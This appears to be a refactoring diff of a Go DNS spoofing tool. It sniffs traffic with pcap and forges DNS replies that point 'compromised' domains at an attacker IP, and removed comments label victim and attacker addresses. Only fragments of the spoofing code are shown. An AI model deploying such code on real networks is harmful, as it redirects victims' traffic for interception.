@@ -1,6 +1,3 @@
-// victim ip:      172.24.18.154
-// attacker's ip:  172.24.19.181
-
 package main
 
 import (
@@ -17,29 +14,20 @@ import (
     "github.com/google/gopacket/layers"
 )
 
-type DnsMsg struct {
-	Timestamp       string
-	SourceIP        string
-	DestinationIP   string
-	DnsQuery        string
-	DnsAnswer       []string
-	DnsAnswerTTL    []string
-	NumberOfAnswers string
-	DnsResponseCode string
-	DnsId           string
-	DnsOpCode       string
-}
-
 var (
+	eth layers.Ethernet
+	ip4 layers.IPv4
+	ip6 layers.IPv6
+	tcp layers.TCP
+	udp layers.UDP
+	dns layers.DNS
+	payload gopacket.Payload
+	snapshot_len int32  = 1024
+	promiscuous  bool   = true
+	timeout      time.Duration = 1 * time.Second
 	intface    string
-	filename   string
-	devName    string
-	es_index   string
-	es_docType string
-	es_server  string
 	err        error
 	handle     *pcap.Handle
-	InetAddr   string
 	SrcIP      string
 	DstIP      string
 	SrcPort    string
@@ -62,33 +50,16 @@ func stringInSlice(a string, list []string) bool {
 
 
 func captureLiveTraffic(interfaceName string, bpfFilter string, attacker map[string]string){
-	var (
-		device       string = ""
-		snapshot_len int32  = 1024
-		promiscuous  bool   = true
-		err          error
-		timeout      time.Duration = 1 * time.Second
-		handle       *pcap.Handle
-	)
-
+	
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		log.Fatal(err)
 	}
 
 	intface = devices[0].Name
-	device = intface
-	var eth layers.Ethernet
-	var ip4 layers.IPv4
-	var ip6 layers.IPv6
-	var tcp layers.TCP
-	var udp layers.UDP
-	var dns layers.DNS
-	var payload gopacket.Payload
-
 
 	// Open device
-	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
+	handle, err = pcap.OpenLive(intface, snapshot_len, promiscuous, timeout)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -142,12 +113,7 @@ func captureLiveTraffic(interfaceName string, bpfFilter string, attacker map[str
 }
 
 func sendDnsPacket(dnsId int, vicIp string, vicPort string, orgDnsServerIp string, domain_name string, attacker_ip string){	
-	handle, err = pcap.OpenLive(intface, 1024, true, pcap.BlockForever)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer handle.Close()
-
+	
 	eth := layers.Ethernet{
 		SrcMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 		DstMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
@@ -247,7 +213,6 @@ func main(){
   		}
   		lines := strings.Split(string(data), "\n")
   		
-  		// every compromised domain will have an attacker ip
   		attacker := make(map[string]string)
   		for index, element := range lines {
     		_ = index
